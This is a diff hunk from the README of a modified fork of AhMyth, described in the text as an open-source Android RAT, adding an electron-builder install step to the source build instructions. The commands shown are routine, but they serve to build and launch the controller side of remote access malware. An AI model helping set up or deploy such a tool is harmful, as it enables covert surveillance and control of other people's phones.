@@ -44,6 +44,7 @@ AhMyth is an popular open source android rat. But the official AhMyth contains m
  - Electron-builder and electron-packer (to build binaries for (OSX,WINDOWS,LINUX))
  - `git clone https://github.com/HiddenPirates/AhMyth-Modified-Version.git`
  - `cd AhMyth-Modified-Version/AhMyth-Server`
+ - `npm install electron-builder --save-dev`
  - `npm start`
  
 #### 2) From binaries
